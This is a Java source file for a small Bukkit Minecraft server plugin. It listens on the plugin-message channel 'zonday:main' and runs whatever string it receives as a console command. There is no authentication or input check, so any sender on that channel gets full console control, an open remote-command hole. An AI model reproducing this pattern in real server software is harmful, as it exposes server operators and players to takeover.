package fr.ernicani;

import com.google.common.io.ByteArrayDataInput;
import com.google.common.io.ByteStreams;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.messaging.PluginMessageListener;


public final class websocket extends JavaPlugin implements PluginMessageListener {



    @Override
    public void onEnable() {
        try {
            getServer().getMessenger().registerIncomingPluginChannel( this, "zonday:main", this );
            Bukkit.getConsoleSender().sendMessage("§b[WebSocket] Plugin activé !");
        } catch (Exception e) {
            Bukkit.getConsoleSender().sendMessage("§c[WebSocket] Erreur survenue lors de l'activation du plugin : " + e);
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§c[WebSocket] Plugin désactivé !");
    }

    @Override
    public void onPluginMessageReceived(String channel, Player player, byte[] bytes)
    {
        if ( !channel.equalsIgnoreCase( "zonday:main" ) )
        {
            return;
        }
        ByteArrayDataInput in = ByteStreams.newDataInput( bytes );
        String subChannel = in.readUTF();
        if ( subChannel.equalsIgnoreCase( "zonday:main" ) )
        {
            String data = in.readUTF();
            Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), data);


        }
    }


}
